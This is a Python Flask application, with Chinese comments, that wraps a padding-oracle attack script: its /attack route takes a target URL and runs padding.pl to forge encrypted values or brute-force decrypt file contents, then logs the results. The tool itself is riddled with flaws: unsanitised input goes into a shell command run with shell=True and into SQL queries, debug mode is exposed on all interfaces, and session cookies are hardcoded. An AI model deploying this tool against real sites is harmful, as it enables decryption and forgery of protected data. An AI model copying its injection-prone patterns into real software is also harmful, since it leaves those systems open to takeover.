#!/usr/bin/env python
#coding:utf8
from flask import Flask, session, redirect, url_for, escape, request, render_template
import requests
import sqlite3,subprocess
import urlparse
import threading
from urllib import unquote
app = Flask(__name__)



header={"Accept-Language": "zh-cn,zh;q=0.8,en-us;q=0.5,en;q=0.3",
    "Content-Type": "application/x-www-form-urlencoded",
    "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:32.0) Gecko/20100101 Firefox/32.0",
    "Referer": "http://wooyun.org/bugs/wooyun-2015-111",
    "Cookie":"security=low; security=low; DNbC_2132_saltkey=x8MGMMVU; PHPSESSID=de8c89ce19ebb4c4fb1fbab7bd5d2e59; FGKFG_username=9dc0hp4ilQi7jkAdjMQGxTxJ6wlaH9i4p8sFkjTDWJYJm_zeIOPuEI3as2WN5Y0Bj5u5ZjY79UfqOSfRP_rivnc2Rw; FGKFG_userid=9dc04KVpG1W2BRKD8qJWO7luluQJMCq9HgvkfQw4vBwqDtM",
    "Connection": "keep-alive",}



@app.route('/',methods=['GET', 'POST'])
def hello_world():
    return render_template("index.html")


'''
得到Encrypted value
'''
@app.route('/attack')
def attack():
    # show the post with the given id, the id is an integer
    url = request.args.get('url')
    type = request.args.get('type')
    url_data = urlparse.urlparse(url)
    if url and type :
        '''
        两个选项： 
            1. 得到Encrypted
            2. 爆破得到文件内容
        '''

        if type == "1":
            file_name = request.args.get('file')
            table = "encrypted_log"
            comman = 'perl ./padding.pl "{}" {} 16 -encoding 3 -plaintext "{}"'.format(unquote(url),urlparse.parse_qs(url_data.query,True)['d'][0],file_name)
        elif type == "2":
            table = "bruteforce_log"
            comman = "perl ./padding.pl \"{}\" {} 16 -encoding 3 -bruteforce ".format(unquote(url),urlparse.parse_qs(url_data.query,True)['d'][0])
        else:
            return "error type ! 1 or 2 "

        if request_test(url):
            # comman = "ping -c 5 127.0.0.1
            t=threading.Thread(target=process_exec_and_insert,args=(comman,url_data,table))
            t.start()
            # get_encrypted_main(comman,url_data)
            
            return 'Starting attack! Please wait for minutes !'
        else:
            return "Can't connect url! Please check it."
    else:
        return "args error!"




'''
从日志中拿到log
'''
@app.route('/get_log')
def get_log():
    if request.args.get('table'):
        conn = sqlite3.connect('log.db')
        c = conn.cursor()
        try:
            c.execute("SELECT * FROM '{}' WHERE host = '{}' ".format(request.args.get('table'),request.args.get('host')))
            data = ''
            for d in c.fetchall():
                data += d[1]+"<br>"
            return data
        except Exception,e:
            # print e
            return e[0]
        conn.commit()
        conn.close()
    else:
        return 'table && host!'



'''
执行子进程 perl脚本
'''
def process_exec_and_insert(comman,url_data,table):
    try:
        p = subprocess.Popen(comman,shell=True, stdout=subprocess.PIPE)
        while True:
            line = p.stdout.readline()
            insert_to_log(url_data.hostname,line,table)
            if not line:
                break
    except Exception,e:
        return 'e'

def request_test(url):
    try:
        requests.get(url,headers=header)
        return True
    except:
        return False

'''
log插入数据库
'''

def insert_to_log(host,data,table):
    conn = sqlite3.connect('log.db')
    c = conn.cursor()
    try:
        c.execute("SELECT * FROM {}".format(table))
    except Exception,e:
        if "no such table" in e[0]:
            c.execute("CREATE TABLE {} (host text, data text)".format(table))
    c.execute('INSERT INTO {} VALUES(?,?)'.format(table), [host,data])
    conn.commit()
    conn.close()



if __name__ == '__main__':
    try:
        app.debug = True
        app.run(host='0.0.0.0', port=8080, debug=True)
    except KeyboardInterrupt:
        print 'exit'
        exit()
